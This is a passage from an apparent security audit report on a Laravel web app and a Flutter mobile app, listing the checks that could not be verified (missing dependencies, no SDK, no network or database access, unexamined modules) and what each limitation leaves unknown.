| **Mobile secret storage** | **MEDIUM-HIGH.** Bearer token in plaintext `get_storage`; no Keychain or Keystore. Not remotely exploitable on its own. **Clean result: no keystore, password or API secret ever committed in 68 commits** | SEC-34, SEC-21 |

---

## Appendix B — Could not verify / BLOCKED (consolidated)

1. **Repo A `vendor/` absent** → PHPUnit, every `php artisan` command and all static analysis were
   **NOT EXECUTED, not failed**. Also blocks source-level confirmation of Laravel's
   `validateMimes`/`shouldBlockPhpUpload` behaviour (SEC-15), the installer's `canInstall` gate (SEC-33),
   and the `RegisterFacades` question behind the undefined-`Schedule` defect (Section 4.3).
2. **Repo B has no Flutter and no Dart SDK** → `flutter analyze`, `flutter test`, `flutter build` and
   `pub outdated` were not attempted. **Whether Repo B compiles at all is UNKNOWN.** The single
   highest-value empirical check is one `flutter build apk --release` plus `adb logcat` to confirm SEC-20
   in a release build.
3. **No live HTTP request was possible** (egress proxy refused CONNECT) → SEC-32, SEC-25 and SEC-33 remain
   PARTIAL on the reachability limb. **Whether `/.git/` is deployed is the one UNKNOWN that could raise
   SEC-32 to CRITICAL.**
4. **No database access** → production schema state (Section 4.2), the effective upload allowlist, whether
   `email_verification` or 2FA are enabled, and whether the Finance permission rows exist are all UNKNOWN.
5. **The effective middleware stack per URI is UNKNOWN** because route files are registered twice
   (Section 2.2(a)). Every "no auth middleware" claim rests on reading the route file. **Confirm first.**
6. **~58 of 69 addon modules were not examined** (Section 2.2(b)) — the largest unexamined surface, and
   the modules that *were* read contained two CRITICAL findings.
7. **`ApiController.php` (7,404 lines) and `DashboardController.php` (7,631) were sampled, not exhausted**
   — the true IDOR count is a floor (Section 2.2(c)).
8. **2,392 Blade sinks were triaged, not all opened** (Section 2.2(d)); **~24 gateway callbacks were not
   individually audited** (Section 2.2(e)).
9. **`storage/logs/` does not exist in the checkout**, so SEC-25's *logging* is proven from code while its
   *contents* are inferred. Check the server and treat what is there as live secrets.
10. **`tokenizer` and `zip` PHP extensions were not confirmed** present (Section 5.1).
11. **Commercial and contractual facts are outside both repositories**: whether a Syncfusion licence is
    held, whether `deliverysyria.api_key` is real or a placeholder, whether the MyFatoorah key is a test
    token, whether the production cron runs `schedule:run`, and whether the "Powered by Lynomia"
    attribution is agreed. **Each needs an answer from the owner, and three of them have long lead times.**
12. **No secret value was read into or recorded in this document.** Credentials are identified by variable
    name and `file:line` only.
